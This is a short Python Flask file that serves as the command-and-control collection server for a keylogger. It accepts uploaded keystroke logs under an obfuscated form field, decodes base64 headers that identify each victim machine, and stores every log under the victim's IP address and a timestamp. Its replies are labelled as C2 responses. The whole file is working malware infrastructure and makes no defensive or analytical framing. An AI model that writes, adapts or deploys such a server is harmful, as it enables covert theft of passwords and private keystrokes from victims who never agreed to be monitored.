import os
import base64
from datetime import datetime
from flask import Flask, flash,request, redirect, url_for
from werkzeug.utils import secure_filename

KLOG_UPLOAD_DIR = "" ##Keylogger File Dir goes here

klog_server = Flask(__name__)
klog_server.config['KLOG_UPLOAD_DIR'] = KLOG_UPLOAD_DIR

@klog_server.route('/klog_endpoint',methods=['GET','POST','HEAD']) ##This is a place holder endpoint name; HEAD Method needed
def klog_collect():
	if request.method == 'POST':
		klog_file =  request.files["bbe02f946d5455d74616fc9777557c22"]
		header_list = request.headers.__getitem__('Sn')
		getid_headers = base64.b64decode(request.headers.__getitem__('Nn')) + b'_' + base64.b64decode(request.headers.__getitem__('Sn'))
		filename = getid_headers + b'_'+ bytes(request.remote_addr, encoding='utf-8') + b'_' +bytes(datetime.now().isoformat(timespec='seconds'), encoding='utf-8')
		out = klog_file.save(KLOG_UPLOAD_DIR + filename.decode('utf-8'))
		if(out == None):
			return "[*]C2 Request Successful!"
		elif(out !=  None):
			return "[*]C2 Request Error!"
